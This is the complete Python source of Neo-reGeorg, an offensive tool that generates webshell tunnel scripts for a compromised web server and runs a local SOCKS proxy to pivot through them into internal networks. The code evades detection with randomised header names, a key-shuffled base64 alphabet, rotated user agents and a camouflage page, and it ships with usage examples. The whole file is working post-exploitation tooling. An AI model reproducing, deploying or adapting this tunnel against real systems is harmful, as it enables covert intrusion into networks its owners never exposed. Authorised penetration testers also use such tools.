#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__  = 'L'
__version__ = '1.1.0'

import sys
import os
import re
import base64
import struct
import random
import hashlib
import logging
import argparse
import requests
from time import sleep
from socket import *
from itertools import chain
from threading import Thread

requests.packages.urllib3.disable_warnings()

ROOT = os.path.dirname(os.path.realpath(__file__))

ispython3 = True if sys.version_info >= (3, 0) else False

# Constants
SOCKTIMEOUT       = 5
VER               = b"\x05"
METHOD            = b"\x00"
SUCCESS           = b"\x00"
REFUSED           = b"\x05"
#SOCKFAIL         = b"\x01"
#NETWORKFAIL      = b"\x02"
#HOSTFAIL         = b"\x04"
#TTLEXPIRED       = b"\x06"
#UNSUPPORTCMD     = b"\x07"
#ADDRTYPEUNSPPORT = b"\x08"
#UNASSIGNED       = b"\x09"

# Globals
READBUFSIZE  = 1024
MAXTHERADS   = 1000
READINTERVAL = 100

# Logging
RESET_SEQ = "\033[0m"
COLOR_SEQ = "\033[1;%dm"
BOLD_SEQ  = "\033[1m"

BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)

# CRITICAL > ERROR > WARNING > INFO > DEBUG > NOTSET
LEVEL = [
    ('ERROR', logging.ERROR),
    ('INFO', logging.INFO),
    ('DEBUG', logging.DEBUG),
]

COLORS = {
    'WARNING':  YELLOW,
    'INFO':     WHITE,
    'DEBUG':    BLUE,
    'CRITICAL': YELLOW,
    'ERROR':    RED,
    'RED':      RED,
    'GREEN':    GREEN,
    'YELLOW':   YELLOW,
    'BLUE':     BLUE,
    'MAGENTA':  MAGENTA,
    'CYAN':     CYAN,
    'WHITE':    WHITE,
}


def formatter_message(message, use_color=True):
    if use_color:
        message = message.replace("$RESET", RESET_SEQ).replace("$BOLD", BOLD_SEQ)
    else:
        message = message.replace("$RESET", "").replace("$BOLD", "")
    return message


class ColoredFormatter(logging.Formatter):
    def __init__(self, msg, use_color=True):
        logging.Formatter.__init__(self, msg)
        self.use_color = use_color

    def format(self, record):
        levelname = record.levelname
        if self.use_color and levelname in COLORS:
            levelname_color = COLOR_SEQ % (30 + COLORS[levelname]) + levelname + RESET_SEQ
            record.levelname = levelname_color
        return logging.Formatter.format(self, record)


class ColoredLogger(logging.Logger):

    def __init__(self, name):
        FORMAT = "[$BOLD%(levelname)-19s$RESET]  %(message)s"
        COLOR_FORMAT = formatter_message(FORMAT, True)
        logging.Logger.__init__(self, name, 'INFO')
        if (name == "transfer"):
            COLOR_FORMAT = "\x1b[80D\x1b[1A\x1b[K%s" % COLOR_FORMAT
        color_formatter = ColoredFormatter(COLOR_FORMAT)
        console = logging.StreamHandler()
        console.setFormatter(color_formatter)
        self.addHandler(console)


logging.setLoggerClass(ColoredLogger)
log = logging.getLogger(__name__)
transferLog = logging.getLogger("transfer")


class SocksCmdNotImplemented(Exception):
    pass


class SocksProtocolNotImplemented(Exception):
    pass


class RemoteConnectionFailed(Exception):
    pass


class Rand:
    def __init__(self, key):
        n = int(hashlib.sha512(key.encode()).hexdigest(), 16)
        self.k_clist = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        self.v_clist = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_"
        self.k_clen = len(self.k_clist)
        self.v_clen = len(self.v_clist)
        random.seed(n)

    def header_key(self):
        str_len = random.getrandbits(4) + 2 # len 2 to 18
        return ''.join([ self.k_clist[random.getrandbits(10) % self.k_clen] for _ in range(str_len) ]).capitalize()

    def header_value(self):
        str_len = random.getrandbits(6) + 2 # len 2 to 66
        return ''.join([ self.v_clist[random.getrandbits(10) % self.v_clen] for _ in range(str_len) ])

    def base64_chars(self, charslist):
        if sys.version_info >= (3, 2):
            newshuffle = random.shuffle
        else:
            try:
                xrange
            except NameError:
                xrange = range
            def newshuffle(x):
                def _randbelow(n):
                    getrandbits = random.getrandbits
                    k = n.bit_length()
                    r = getrandbits(k)
                    while r >= n:
                        r = getrandbits(k)
                    return r

                for i in xrange(len(x) - 1, 0, -1):
                    j = _randbelow(i+1)
                    x[i], x[j] = x[j], x[i]

        newshuffle(charslist)


class session(Thread):
    def __init__(self, pSocket, connectURL):
        Thread.__init__(self)
        self.pSocket = pSocket
        self.connectURL = connectURL
        self.conn = requests.Session()
        self.conn.proxies = PROXY
        self.conn.verify = False
        for key, value in ADD_COOKIE.items():
            self.conn.cookies.set(key, value)
        self.conn.headers['Accept-Encoding'] = 'deflate'
        self.conn.headers['User-Agent'] = USERAGENT
        self.connect_closed = False

    def parseSocks5(self, sock):
        log.debug("SocksVersion5 detected")
        nmethods, methods = (sock.recv(1), sock.recv(1))
        sock.sendall(VER + METHOD)
        ver = sock.recv(1)
        if ver == b"\x02":                # this is a hack for proxychains
            ver, cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))
        else:
            cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1))
        target = None
        targetPort = None
        if atyp == b"\x01":      # IPv4
            target = sock.recv(4)
            targetPort = sock.recv(2)
            target = inet_ntoa(target)
        elif atyp == b"\x03":             # Hostname
            targetLen = ord(sock.recv(1)) # hostname length (1 byte)
            target = sock.recv(targetLen)
            targetPort = sock.recv(2)
            try:
                target = gethostbyname(target)
            except:
                log.error("DNS resolution failed(%s)" % target.decode())
                return False
        elif atyp == b"\x04":    # IPv6
            target = sock.recv(16)
            targetPort = sock.recv(2)
            target = inet_ntop(AF_INET6, target)

        targetPortNum = struct.unpack('>H', targetPort)[0]

        if cmd == b"\x02":   # BIND
            raise SocksCmdNotImplemented("Socks5 - BIND not implemented")
        elif cmd == b"\x03": # UDP
            raise SocksCmdNotImplemented("Socks5 - UDP not implemented")
        elif cmd == b"\x01": # CONNECT
            serverIp = inet_aton(target)
            self.cookie = self.setupRemoteSession(target, targetPortNum)
            if self.cookie:
                sock.sendall(VER + SUCCESS + b"\x00" + b"\x01" + serverIp + targetPort)
                return True
            else:
                sock.sendall(VER + REFUSED + b"\x00" + b"\x01" + serverIp + targetPort)
                raise RemoteConnectionFailed("[%s:%d] Remote failed" % (target, targetPortNum))

        raise SocksCmdNotImplemented("Socks5 - Unknown CMD")

    def parseSocks4(self, sock):
        log.debug("SocksVersion4 detected")
        cmd = sock.recv(1)
        if cmd == b"\x01":  # CONNECT
            targetPort = sock.recv(2)
            targetPortNum = struct.unpack('>H', targetPort)[0]
            serverIp = sock.recv(4)
            username = sock.recv(1)
            if serverIp == b'\x00\x00\x00\x01':
                serverIp = sock.recv(254)[:-1]  # max length hostname
                try:
                    target = gethostbyname(serverIp)
                except:
                    log.error("DNS resolution failed(%s)" % target.decode())
                    return False
                serverIp = inet_aton(target)
            else:
                target = inet_ntoa(serverIp)

            self.cookie = self.setupRemoteSession(target, targetPortNum)
            if self.cookie:
                sock.sendall(b"\x00" + b"\x5a" + serverIp + targetPort)
                return True
            else:
                sock.sendall(b"\x00" + b"\x91" + serverIp + targetPort)
                raise RemoteConnectionFailed("Remote connection failed")
        else:
            raise SocksProtocolNotImplemented("Socks4 - Command [%d] Not implemented" % ord(cmd))

    def handleSocks(self, sock):
        ver = sock.recv(1)
        if ver == b"\x05":
            return self.parseSocks5(sock)
        elif ver == b"\x04":
            return self.parseSocks4(sock)

    def error_log(self, str_format, headers):
        if K['X-ERROR'] in headers:
            message = headers[K["X-ERROR"]]
            if message in rV:
                message = rV[message]
            log.error(str_format.format(repr(message)))

    def encode(self, data):
        data = base64.b64encode(data)
        if ispython3:
            data = data.decode()
        return data.translate(EncodeMap)

    def decode(self, data):
        if ispython3:
            data = data.decode()
        return base64.b64decode(data.translate(DecodeMap))

    def setupRemoteSession(self, target, port):
        target_data = ("%s|%d" % (target, port)).encode()
        headers = {K["X-CMD"]: V["CONNECT"], K["X-TARGET"]: self.encode(target_data)}
        headers.update(HEADERS)
        self.target = target
        self.port = port
        response = self.conn.post(self.connectURL, headers=headers)
        rep_headers = response.headers
        if response.status_code == 200:
            if K['X-STATUS'] in rep_headers:
                status = rep_headers[K["X-STATUS"]]
            else:
                log.critical('Bad KEY or non-neoreg server')
                return False
            if status == V["OK"] and 'set-cookie' in rep_headers:
                cookie = rep_headers["set-cookie"]
                log.info("[%s:%d] HTTP [200]: cookie [%s]" % (self.target, self.port, cookie))
                return cookie
            else:
                self.error_log('{}', rep_headers)
        else:
            self.error_log("[%s:%d] HTTP [%d]: [{}]" % (self.target, self.port, response.status_code), rep_headers)
            log.error("[%s:%d] RemoteError: %s" % (self.target, self.port, response.text))

    def closeRemoteSession(self):
        if not self.connect_closed:
            try:
                self.pSocket.close()
                log.debug("[%s:%d] Closing localsocket" % (self.target, self.port))
            except:
                log.debug("Localsocket already closed")

            headers = {K["X-CMD"]: V["DISCONNECT"]}
            headers.update(HEADERS)
            response = self.conn.post(self.connectURL, headers=headers)
            if not self.connect_closed and response.status_code == 200:
                if hasattr(self, 'target'):
                    log.info("[%s:%d] Connection Terminated" % (self.target, self.port))
                else:
                    log.error("Can't find target")
            self.conn.close()
            self.connect_closed = True

    def reader(self):
        try:
            headers = {K["X-CMD"]: V["READ"]}
            headers.update(HEADERS)
            while True:
                try:
                    if self.connect_closed or not self.pSocket:
                        break
                    response = self.conn.post(self.connectURL, headers=headers)
                    rep_headers = response.headers
                    if response.status_code == 200:
                        status = rep_headers[K["X-STATUS"]]
                        if status == V["OK"]:
                            data = response.content
                            if len(data) == 0:
                                sleep(READINTERVAL)
                                continue
                            data = self.decode(data)
                            # data = data[:-3]
                            # Yes I know this is horrible, but its a quick fix to issues with tomcat 5.x
                            # bugs that have been reported, will find a propper fix laters
                            if 'server' in rep_headers:
                                if rep_headers["server"].find("Apache-Coyote/1.1") > 0:
                                    data = data[:-1]
                        else:
                            msg = "[%s:%d] HTTP [%d]: Status: [%s]: Message [{}] Shutting down" % (self.target, self.port, response.status_code, rV[status])
                            self.error_log(msg, rep_headers)
                            break
                    else:
                        log.error("[%s:%d] HTTP [%d]: Shutting down" % (self.target, self.port, response.status_code))
                        break
                    transferLog.info("[%s:%d] <<<< [%d]" % (self.target, self.port, len(data)))
                    self.pSocket.send(data)
                except error: # python2 socket.send error
                    pass
                except Exception as ex:
                    raise ex
        finally:
            self.closeRemoteSession()

    def writer(self):
        try:
            headers = {K["X-CMD"]: V["FORWARD"], "Content-Type": "application/octet-stream"}
            headers.update(HEADERS)
            while True:
                try:
                    self.pSocket.settimeout(1)
                    data = self.pSocket.recv(READBUFSIZE)
                    if not data:
                        break
                    data = self.encode(data)
                    response = self.conn.post(self.connectURL, headers=headers, data=data)
                    rep_headers = response.headers
                    if response.status_code == 200:
                        status = rep_headers[K["X-STATUS"]]
                        if status != V["OK"]:
                            msg = "[%s:%d] HTTP [%d]: Status: [%s]: Message [{}] Shutting down" % (self.target, self.port, response.status_code, rV[status])
                            self.error_log(msg, rep_headers)
                            break
                    else:
                        log.error("[%s:%d] HTTP [%d]: Shutting down" % (self.target, self.port, response.status_code))
                        break
                    transferLog.info("[%s:%d] >>>> [%d]" % (self.target, self.port, len(data)))
                except timeout:
                    continue
                except Exception as ex:
                    raise ex
                    break
        finally:
            self.closeRemoteSession()

    def run(self):
        try:
            if self.handleSocks(self.pSocket):
                log.debug("Staring reader")
                r = Thread(target=self.reader)
                r.start()
                log.debug("Staring writer")
                w = Thread(target=self.writer)
                w.start()
                r.join()
                w.join()
        except SocksCmdNotImplemented as si:
            log.error(si)
        except SocksProtocolNotImplemented as spi:
            log.error(spi)
        except Exception as e:
            log.error(e)
            self.closeRemoteSession()


def askGeorg(connectURL):
    log.info("Checking if Georg is ready")
    headers = {'User-Agent': USERAGENT}
    headers.update(HEADERS)
    response = requests.get(connectURL, headers=headers, proxies=PROXY, verify=False)
    if response.status_code == 200:
        if BASICCHECKSTRING == response.content.strip():
            log.info("Georg says, 'All seems fine'")
            return True


def choice_useragent():
    user_agents = [
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
       "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
       "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.11 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.11",
       "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
       "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0",
       "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:38.0) Gecko/20100101 Firefox/38.0"
    ]
    return random.choice(user_agents)


def file_read(filename):
    try:
        with open(filename) as f:
            return f.read()
    except:
        log.error("Failed to read file: %s" % filename)
        exit()


def file_write(filename, data):
    try:
        with open(filename, 'w') as f:
            f.write(data)
    except:
        log.error("Failed to write file: %s" % filename)
        exit()

banner = r"""

          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version {}
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/neoreg
""".format(__version__)

use_examples = r"""
                [ Basic Use ]

   ./neoreg.py generate -k <you_password>
   ./neoreg.py -k <you_password> -u <server_url>

               [ Advanced Use ]

   ./neoreg.py generate -k <you_password> --file 404.html
   ./neoreg.py -k <you_password> -u <server_url> \
           --skip --proxy http://127.0.0.1:8080 -vv \
           -H 'Authorization: cm9vdDppcyB0d2VsdmU='

"""

if __name__ == '__main__':
    if len(sys.argv) == 1:
        print(banner)
        print(use_examples)
        exit()
    elif len(sys.argv) > 1 and sys.argv[1] == 'generate':
        del sys.argv[1] 
        parser = argparse.ArgumentParser(description='Generate neoreg webshell')
        parser.add_argument("-k", "--key", metavar="KEY", required=True, help="Specify connection key.")
        parser.add_argument("-o", "--outdir", metavar="DIR", help="Output directory.", default='neoreg_server')
        parser.add_argument("-f", "--file", metavar="FILE", help="Camouflage html page file")
        parser.add_argument("--read-buff", metavar="Bytes", help="Remote read buffer.(default: 513)", type=int, default=513)
        args = parser.parse_args()
    else:
        parser = argparse.ArgumentParser(description='Socks server for Neoreg HTTP(s) tunneller')
        parser.add_argument("-u", "--url", metavar="URI", required=True, help="The url containing the tunnel script")
        parser.add_argument("-k", "--key", metavar="KEY", required=True, help="Specify connection key")
        parser.add_argument("-l", "--listen-on", metavar="IP", help="The default listening address.(default: 127.0.0.1)", default="127.0.0.1")
        parser.add_argument("-p", "--listen-port", metavar="PORT", help="The default listening port.(default: 1080)", type=int, default=1080)
        parser.add_argument("-s", "--skip", help="Skip usability testing", action='store_true')
        parser.add_argument("-H", "--header", metavar="LINE", help="Pass custom header LINE to server", action='append', default=[])
        parser.add_argument("-c", "--cookie", metavar="LINE", help="Custom cookies to server", action='append', default=[])
        parser.add_argument("-x", "--proxy", metavar="LINE", help="proto://host[:port]  Use proxy on given port", default=None)
        parser.add_argument("--read-buff", metavar="Bytes", help="Local read buffer, max data to be sent per POST.(default: 1024)", type=int, default=READBUFSIZE)
        parser.add_argument("--read-interval", metavar="MS", help="Read data interval in milliseconds.(default: 100)", type=int, default=READINTERVAL)
        parser.add_argument("--max-threads", metavar="N", help="Proxy max threads.(default: 1000)", type=int, default=MAXTHERADS)
        parser.add_argument("-v", help="Increase verbosity level (use -vv or more for greater effect)", action='count', default=0)
        args = parser.parse_args()

    rand = Rand(args.key)

    BASE64CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    M_BASE64CHARS = list(BASE64CHARS)
    rand.base64_chars(M_BASE64CHARS)
    M_BASE64CHARS = ''.join(M_BASE64CHARS)

    if ispython3:
        maketrans = str.maketrans
    else:
        from string import maketrans

    EncodeMap = maketrans(BASE64CHARS, M_BASE64CHARS)
    DecodeMap = maketrans(M_BASE64CHARS, BASE64CHARS)

    BASICCHECKSTRING = ('<!-- ' + rand.header_value() + ' -->').encode()

    K = {}
    for name in ["X-STATUS", "X-ERROR", "X-CMD", "X-TARGET"]:
        K[name] = rand.header_key()

    V = {}
    rV = {}
    for name in ["FAIL", "Failed creating socket", "Failed connecting to target", "OK", "Failed writing socket",
            "CONNECT", "DISCONNECT", "READ", "FORWARD", "Failed reading from socket", "No more running, close now",
            "POST request read filed"]:
        value = rand.header_value()
        V[name] = value
        rV[value] = name

    if 'url' in args:
        # neoreg connect
        if args.v > 2:
            args.v = 2
        LEVELNAME, LEVELLOG = LEVEL[args.v]
        log.setLevel(LEVELLOG)
        transferLog.setLevel(LEVELLOG)
        separation = "+" + "-" * 72 + "+"
        print(banner)
        print(separation)
        print("  Log Level set to [%s]" % LEVELNAME)

        USERAGENT = choice_useragent()

        HEADERS = {}
        for header in args.header:
            if header.count(':') == 1:
                key, value = header.split(':', 1)
                HEADERS[key.strip()] = value.strip()
            else:
                log.info("Error parameter: -H %s" % header)
                exit()

        ADD_COOKIE = {}
        for cookie in args.cookie:
            if cookie.count('=') == 1:
                key, value = cookie.split('=', 1)
                ADD_COOKIE[key.strip()] = value.strip()
            else:
                log.info("Error parameter: -c %s" % cookie)
                exit()

        PROXY = { 'http': args.proxy, 'https': args.proxy } if args.proxy else None

        print("  Starting socks server [%s:%d], tunnel at [%s]" % (args.listen_on, args.listen_port, args.url))
        print(separation)
        try:
            servSock_start = False
            if not args.skip:
                if not askGeorg(args.url):
                    log.info("Georg is not ready, please check url")
                    exit()

            READBUFSIZE  = args.read_buff
            MAXTHERADS   = args.max_threads
            READINTERVAL = args.read_interval / 1000.0

            try:
                servSock = socket(AF_INET, SOCK_STREAM)
                servSock_start = True
                servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
                servSock.bind((args.listen_on, args.listen_port))
                servSock.listen(MAXTHERADS)
            except Exception as e:
                log.critical(e)
                exit()

            while True:
                try:
                    sock, addr_info = servSock.accept()
                    sock.settimeout(SOCKTIMEOUT)
                    log.debug("Incomming connection")
                    session(sock, args.url).start()
                except KeyboardInterrupt as ex:
                    break
                except Exception as e:
                    log.error(e)
                    raise e
        except requests.exceptions.ProxyError:
            log.error("Unable to connect proxy: %s" % args.proxy)
        except requests.exceptions.ConnectionError:
            log.error("Can not connect to the server")
        finally:
            if servSock_start:
                servSock.close()
    else:
        # neoreg server generate
        print(banner)
        MAXREADBUFF = args.read_buff - (args.read_buff % 3)
        outdir = args.outdir
        if not os.path.isdir(outdir):
            os.mkdir(outdir)
            print('    [+] Mkdir a directory: %s' % outdir)

        keyfile = os.path.join(outdir, 'key.txt')
        file_write(keyfile, args.key)

        script_dir = os.path.join(ROOT, 'scripts')
        print("    [+] Create neoreg server files:")
        for filename in os.listdir(script_dir):
            outfile = os.path.join(outdir, filename)
            filename = os.path.join(script_dir, filename)
            if os.path.isfile(filename) and os.path.basename(filename).startswith('tunnel.'):
                text = file_read(filename)

                if args.file:
                    http_get_content = file_read(args.file).replace('"', '\\"').replace('\n', '')
                else:
                    http_get_content = BASICCHECKSTRING.decode()
                text = re.sub(r"Georg says, 'All seems fine'", http_get_content, text)

                text = re.sub(r"BASE64 CHARSLIST", M_BASE64CHARS, text)

                text = re.sub(r"\b513\b", str(MAXREADBUFF), text)

                for k, v in chain(K.items(), V.items()):
                    text = re.sub(r'\b%s\b' % k, v, text)
                file_write(outfile, text)
                print("       => %s/%s" % (outdir, os.path.basename(outfile)))
        print('')

